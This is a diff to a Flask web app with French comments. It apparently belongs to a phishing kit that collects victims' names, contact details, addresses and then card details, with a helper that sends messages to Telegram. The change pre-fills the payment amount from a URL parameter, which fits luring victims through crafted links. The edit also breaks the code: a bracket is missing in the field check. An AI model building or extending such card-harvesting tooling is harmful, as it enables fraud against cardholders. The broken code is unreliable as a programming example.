@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for, session
+from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 import requests
 
 app = Flask(__name__)
@@ -22,6 +22,11 @@ def send_telegram_message(message):
 # Route pour la page d'accueil (formulaire paiement)
 @app.route('/', methods=['GET', 'POST'])
 def payment_form():
+    # Récupérer le montant depuis l'URL
+    montant = request.args.get('montant')
+    if montant:
+        session['montant'] = montant  # Stocker le montant dans la session
+
     if request.method == 'POST':
         # Récupération des données du formulaire de paiement
         session['nom'] = request.form.get('nom', '').strip()
@@ -30,14 +35,14 @@ def payment_form():
         session['email'] = request.form.get('email', '').strip()
         session['adresse_facturation'] = request.form.get('adresse_facturation', '').strip()
         session['adresse_livraison'] = request.form.get('adresse_livraison', '').strip()
-        session['montant'] = request.form.get('montant', '').strip()
 
-        if not all([session['nom'], session['prenom'], session['telephone'], session['email'], session['adresse_facturation'], session['adresse_livraison'], session['montant']]):
+        if not all([session['nom'], session['prenom'], session['telephone'], session['email'], session['adresse_facturation'], session['adresse_livraison'], session['montant']):
             return "❌ Erreur : Tous les champs sont obligatoires.", 400
 
         return redirect(url_for('credit_card_form'))
     
-    return render_template('paiement.html')
+    # Afficher le formulaire de paiement avec le montant pré-rempli
+    return render_template('paiement.html', montant=session.get('montant'))
 
 # Route pour le formulaire de carte de crédit
 @app.route('/credit-card', methods=['GET', 'POST'])
@@ -99,4 +104,4 @@ def payment_confirmation():
     return render_template('confirmation.html', nom=session.get('nom'), prenom=session.get('prenom'), montant=session.get('montant'))
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5004)
+    app.run(debug=True, host='0.0.0.0', port=5005)
